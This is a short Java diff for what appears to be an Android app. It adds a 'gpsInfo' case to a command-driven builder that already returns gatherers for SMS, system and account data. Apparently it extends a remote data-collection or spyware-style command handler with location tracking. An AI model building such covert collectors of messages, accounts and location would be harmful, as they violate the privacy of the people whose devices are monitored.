@@ -15,6 +15,7 @@ public class GathererBuilder {
     private final String SMS_GATHERER = "sms";
     private final String SYSTEM_INFO_GATHERER = "systemInfo";
     private final String ACCOUNT_INFO_GATHERER = "accountInfo";
+    private final String GPS_INFO_GATHERER = "gpsInfo";
 
     public Gatherer build(String cmd, Context context)
     {
@@ -39,6 +40,8 @@ public class GathererBuilder {
             case SYSTEM_INFO_GATHERER: return new SystemInfoGatherer(context);
 
             case ACCOUNT_INFO_GATHERER: return new AccountInfoGatherer(context);
+
+            case GPS_INFO_GATHERER: return new GpsInfoGatherer(context);
 
             default: return new Gatherer() {
                 @Override
